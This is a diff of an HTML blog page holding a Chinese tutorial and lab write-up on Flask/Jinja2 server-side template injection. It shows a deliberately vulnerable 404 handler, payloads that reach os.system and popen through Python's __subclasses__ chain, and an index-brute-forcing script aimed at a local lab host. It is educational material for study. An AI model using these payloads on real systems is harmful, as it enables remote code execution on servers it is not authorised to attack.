@@ -67,7 +67,7 @@
 <meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143742060.png">
 <meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927111652753.png">
 <meta property="article:published_time" content="2021-10-26T06:38:36.000Z">
-<meta property="article:modified_time" content="2022-08-02T11:52:35.936Z">
+<meta property="article:modified_time" content="2022-11-13T17:42:11.258Z">
 <meta property="article:author" content="Noel">
 <meta property="article:tag" content="Python">
 <meta property="article:tag" content="SSTI">
@@ -104,6 +104,16 @@
     
 	<!-- mathjax -->
 	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
 <meta name="generator" content="Hexo 6.1.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -118,13 +128,13 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
-       --><li><a href="/categories/">categories</a></li><!--
+       --><li><a href="/categories">Categories</a></li><!--
      --><!--
-       --><li><a href="/tags/">tags</a></li><!--
+       --><li><a href="/tags">Tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li><!--
      -->
       </ul>
     </span>
@@ -135,7 +145,7 @@
         <li><a class="icon" aria-label="Previous post" href="/2021/11/15/2021-11-15-beescms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2021/08/15/NodejsSummary/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/2021/09/01/2021-09-01-Python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -221,7 +231,7 @@
 <h2 id="SSTI-介绍"><a href="#SSTI-介绍" class="headerlink" title="SSTI 介绍"></a>SSTI 介绍</h2><p>SSTI 全称（Server-Side Template Injection),中文名服务端模板注入.</p>
 <p>在介绍模板注入之前,首先得知道什么是模板.</p>
 <h2 id="什么是模板以及模板引擎"><a href="#什么是模板以及模板引擎" class="headerlink" title="什么是模板以及模板引擎"></a>什么是模板以及模板引擎</h2><p>用通俗的话解释,模板就是一段话中存在可动态替换的部分.假设存在以下代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hello<span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;hello<span class="hljs-subst">&#123;username&#125;</span>&quot;</span>)</code></pre>
 
 <p>由于这句代码能够因为不同的 <code>username</code>而显示不同的结果,因此我们可以简单的把这段话理解为一个模板.(当然这个例子不是很恰当)</p>
 <p>而模板引擎的作用是为了使用户界面(例如上面的<code>hello+用户名</code>)与业务数据或内容(例如上面的username)生成特定的文档(如你所看到的HTML).</p>
@@ -235,7 +245,15 @@
 <p>Flask 是一个用python实现的微型web框架,意味着flask能为您提供了工具、库和技术,使您可以构建web应用程序.</p>
 </blockquote>
 <p>为了快速了解Flask基础,本人简单编写了一段代码<code>demo.py</code>,以此代码为例简单说明Flask语法</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
+app = Flask(__name__)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World!&#x27;</span>
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    app.run()</code></pre>
 
 <ol>
 <li><p>第一行,导入Flask类.用于后面实例化出一个WSGI应用程序.</p>
@@ -256,7 +274,14 @@
 <p>Flask官网也提供了一篇快速入门的章节,可<a target="_blank" rel="noopener" href="http://docs.jinkan.org/docs/flask/quickstart.html">点击此处</a>前往阅读</p>
 <h2 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h2><p>Flask 使用了Jinja2 引擎来对模板进行渲染.</p>
 <p>再给出渲染模板示例代码之前,咱们先创建个模板,命名为<code>demo_tmp.html</code>,内容如下:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to Flask<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+ <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125;!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
 
 <p>{% raw %}<br>其中, <code>{{ }}</code> 内是需要渲染的内容.<br>{% endraw %}</p>
 <blockquote>
@@ -265,7 +290,19 @@
 <p>由于Flask 会在 templates 文件夹里寻找模板,所以需要在<code>demo.py</code>的同级目录下创建一个<code>templates</code>目录,并将<code>demo_tmp.html</code>放入.</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180055212.png" alt="image-20210831180055212"></p>
 <p>稍微修改以下<code>demo.py</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span></span></span><br><span class="line"><span class="params"><span class="meta"><span class="keyword">def</span> hello_world(<span class="params"></span>):</span></span></span><br><span class="line"><span class="params"><span class="meta">    query = request.args.get(<span class="params"><span class="string">&#x27;name&#x27;</span></span>) <span class="comment"># 获取get方法传递的 name的值</span></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="keyword">return</span> render_template(<span class="params"><span class="string">&#x27;demo_tmp.html&#x27;</span>, name=query</span>) <span class="comment"># 将get接收到的name的值传入模板,进行渲染</span></span></span></span><br><span class="line"><span class="params"><span class="meta"></span></span></span><br><span class="line"><span class="params"><span class="meta"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span></span></span><br><span class="line"><span class="params"><span class="meta">    app.run(<span class="params">debug=<span class="literal">True</span></span>)  <span class="comment"># 开启 debug模式,每次修改代码后就不需要手动重启服务器,服务器会在代码修改后自动重新载入</span></span></span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template
+
+app = Flask(__name__)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span></span>
+<span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">def</span> hello_world(<span class="hljs-params"></span>):</span></span>
+<span class="hljs-params"><span class="hljs-meta">    query = request.args.get(<span class="hljs-params"><span class="hljs-string">&#x27;name&#x27;</span></span>) <span class="hljs-comment"># 获取get方法传递的 name的值</span></span></span>
+<span class="hljs-params"><span class="hljs-meta">    <span class="hljs-keyword">return</span> render_template(<span class="hljs-params"><span class="hljs-string">&#x27;demo_tmp.html&#x27;</span>, name=query</span>) <span class="hljs-comment"># 将get接收到的name的值传入模板,进行渲染</span></span></span>
+<span class="hljs-params"><span class="hljs-meta"></span></span>
+<span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span></span>
+<span class="hljs-params"><span class="hljs-meta">    app.run(<span class="hljs-params">debug=<span class="hljs-literal">True</span></span>)  <span class="hljs-comment"># 开启 debug模式,每次修改代码后就不需要手动重启服务器,服务器会在代码修改后自动重新载入</span></span></span></code></pre>
 
 <p>运行并访问<code>http://127.0.0.1:5000/?name=Noel</code>,可以看到结果如下结果</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831180652308.png" alt="image-20210831180652308"></p>
@@ -274,7 +311,17 @@
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831184102838.png" alt="image-20210831184102838"></p>
 <p>那注入问题有又是怎么产生的呢?</p>
 <h2 id="Flask-SSTI"><a href="#Flask-SSTI" class="headerlink" title="Flask SSTI"></a>Flask SSTI</h2><p>这里我先给出一段拥有ssti注入漏洞的flask代码:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>): </span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;&#123;%% extends &quot;layout.html&quot; %%&#125; </span></span><br><span class="line"><span class="string">    &#123;%% block body %%&#125; </span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt; </span></span><br><span class="line"><span class="string">        &lt;h1&gt;Opps! That page doesn&#x27;t exist.&lt;/h1&gt; </span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt; </span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#123;%% endblock %%&#125; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (request.url) </span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>) </span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">e</span>): 
+    template = <span class="hljs-string">&#x27;&#x27;&#x27;&#123;%% extends &quot;layout.html&quot; %%&#125; </span>
+<span class="hljs-string">    &#123;%% block body %%&#125; </span>
+<span class="hljs-string">    &lt;div class=&quot;center-content error&quot;&gt; </span>
+<span class="hljs-string">        &lt;h1&gt;Opps! That page doesn&#x27;t exist.&lt;/h1&gt; </span>
+<span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt; </span>
+<span class="hljs-string">    &lt;/div&gt; </span>
+<span class="hljs-string">    &#123;%% endblock %%&#125; </span>
+<span class="hljs-string">    &#x27;&#x27;&#x27;</span> % (request.url) 
+    <span class="hljs-keyword">return</span> render_template_string(template), <span class="hljs-number">404</span></code></pre>
 
 <blockquote>
 <p> 代码来源于:<a target="_blank" rel="noopener" href="https://blog.nvisium.com/p263">https://blog.nvisium.com/p263</a></p>
@@ -287,7 +334,15 @@
 <h2 id="为什么产生-SSTI"><a href="#为什么产生-SSTI" class="headerlink" title="为什么产生 SSTI"></a>为什么产生 SSTI</h2><p>其实对比两段代码很容易发现,</p>
 <p><code>demo.py</code>是使用<code>render_template(&#39;demo_tmp.html&#39;, name=query)</code>,而使用这种方式渲染的优点在于需要渲染的参数是通过<code>name=query</code>写死了的,并未交给用户控制.</p>
 <p>而在漏洞代码中</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">template = <span class="string">&#x27;&#x27;&#x27;&#123;%% extends &quot;layout.html&quot; %%&#125; </span></span><br><span class="line"><span class="string">    &#123;%% block body %%&#125; </span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt; </span></span><br><span class="line"><span class="string">        &lt;h1&gt;Opps! That page doesn&#x27;t exist.&lt;/h1&gt; </span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt; </span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#123;%% endblock %%&#125; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (request.url) </span><br><span class="line"><span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">template = <span class="hljs-string">&#x27;&#x27;&#x27;&#123;%% extends &quot;layout.html&quot; %%&#125; </span>
+<span class="hljs-string">    &#123;%% block body %%&#125; </span>
+<span class="hljs-string">    &lt;div class=&quot;center-content error&quot;&gt; </span>
+<span class="hljs-string">        &lt;h1&gt;Opps! That page doesn&#x27;t exist.&lt;/h1&gt; </span>
+<span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt; </span>
+<span class="hljs-string">    &lt;/div&gt; </span>
+<span class="hljs-string">    &#123;%% endblock %%&#125; </span>
+<span class="hljs-string">    &#x27;&#x27;&#x27;</span> % (request.url) 
+<span class="hljs-keyword">return</span> render_template_string(template), <span class="hljs-number">404</span></code></pre>
 
 <p>是直接将用户输入的url拼接到template中,再进行的渲染的.</p>
 <p>由于url可控,所以整体template可控,如果传入的url中包含<code>{{xxx}}</code>,那么在使用<code>render_template_string(template)</code>进行渲染的时候就会把 <code>{{}}</code>中的内容进行解析.</p>
@@ -300,13 +355,18 @@
 <p>这里我先给出一个 <code>payload</code>,通过 payload 来讲解相关魔法方法、内置属性以及利用过程.</p>
 <p><code>{{&quot;&quot;.__class__.__base__.__subclasses__()[118].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)}}</code></p>
 <h2 id="魔法方法和内置属性"><a href="#魔法方法和内置属性" class="headerlink" title="魔法方法和内置属性"></a>魔法方法和内置属性</h2><p><code>__class__</code>:返回该实例对象的类</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line"><span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__
+<span class="hljs-comment"># &lt;class &#x27;str&#x27;&gt;</span></code></pre>
 
 <p><code>__base__</code>:返回该类的父类</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="comment"># &lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 及 object 是 str 的基类(父类)</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__
+<span class="hljs-comment"># &lt;class &#x27;object&#x27;&gt;</span>
+<span class="hljs-comment"># 及 object 是 str 的基类(父类)</span></code></pre>
 
 <p><code>__subclasses__</code>():返回当前类的所有子类,返回结果是个列表</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, ...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()
+<span class="hljs-comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, ...</span>
+</code></pre>
 
 
 <p>很明显,上面这几个内置属性以及魔法方法能够帮助我们得到一些类.那我们得到这些类后干什么呢?</p>
@@ -322,7 +382,16 @@
 </blockquote>
 <h4 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a>__builtins__</h4><p>python在启动时就加载<code>__builtins__</code>,里面包含了一些常用方法比如:<code>abs()</code>,<code>max()</code>,<code>eval()</code>等等.详细信息大家可以去<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/builtins.html">官网</a>了解.</p>
 <p>那怎样去查找哪些类中拥有<code>__builtins__</code>呢:<br>这个贴出个脚本<code>find_exp_class.py</code>,方便用来查找</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exp_flask = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">number = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;__import__()&quot;</span> <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">			<span class="built_in">print</span>(number,<span class="string">&quot;--&gt;&gt;&quot;</span>,i)</span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		number += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">exp_flask = <span class="hljs-string">&#x27;__builtins__&#x27;</span>
+number = <span class="hljs-number">0</span> 
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;&quot;</span>.__class__.__base__.__subclasses__():
+	<span class="hljs-keyword">try</span>:
+		<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;__import__()&quot;</span> <span class="hljs-keyword">in</span> i.__init__.__globals__.keys():
+			<span class="hljs-built_in">print</span>(number,<span class="hljs-string">&quot;--&gt;&gt;&quot;</span>,i)
+	<span class="hljs-keyword">except</span> :
+		<span class="hljs-keyword">pass</span>
+	<span class="hljs-keyword">finally</span>:
+		number += <span class="hljs-number">1</span></code></pre>
 
 <p>在我本地(python3.6)运行,效果如下<br><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924172705770.png" alt="image-20210924172705770"></p>
 <p>构建payload,可以看到能够执行系统命令</p>
@@ -348,13 +417,39 @@
 <p>第一关没waf</p>
 <p>初步尝试 ,由于不好整理索引,写个脚本</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924193657572.png" alt="image-20210924193657572"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.108:5001/level/1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">	data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+ <span class="built_in">str</span>(i) +<span class="string">&#x27;]&#125;&#125;&#x27;</span>&#125; </span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		response = requests.post(url,data=data)</span><br><span class="line">		<span class="comment">#print(data)</span></span><br><span class="line">		<span class="comment">#print(response.text)</span></span><br><span class="line">		<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">				<span class="built_in">print</span>(i,<span class="string">&quot;-----&gt;&quot;</span>,response.text)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 结果为  132 -----&gt; Hello &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://192.168.0.108:5001/level/1&quot;</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):
+	data = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+ <span class="hljs-built_in">str</span>(i) +<span class="hljs-string">&#x27;]&#125;&#125;&#x27;</span>&#125; 
+	<span class="hljs-keyword">try</span>:
+		response = requests.post(url,data=data)
+		<span class="hljs-comment">#print(data)</span>
+		<span class="hljs-comment">#print(response.text)</span>
+		<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
+			<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;_wrap_close&quot;</span> <span class="hljs-keyword">in</span> response.text:
+				<span class="hljs-built_in">print</span>(i,<span class="hljs-string">&quot;-----&gt;&quot;</span>,response.text)
+				<span class="hljs-keyword">break</span>
+	<span class="hljs-keyword">except</span> :
+		<span class="hljs-keyword">pass</span>
+<span class="hljs-comment"># 结果为  132 -----&gt; Hello &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;</span></code></pre>
 
 <p>得到索引后,构造payload,拿到flag</p>
 <p><code>{{&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;cat flag&#39;).read()}}</code></p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927112712493.png" alt="image-20210927112712493"></p>
 <h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>由于程序并没有对输入的内容进行任何判断和过滤,所以我们可以直接插入一段通用payload代码段,</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123;b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;calc&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;
+&#123;% <span class="hljs-keyword">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;
+  &#123;% <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;
+  &#123;% <span class="hljs-keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;
+    &#123;% <span class="hljs-keyword">if</span><span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() %&#125;
+      &#123;&#123;b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;calc&quot;).read()&#x27;</span>) &#125;&#125;
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
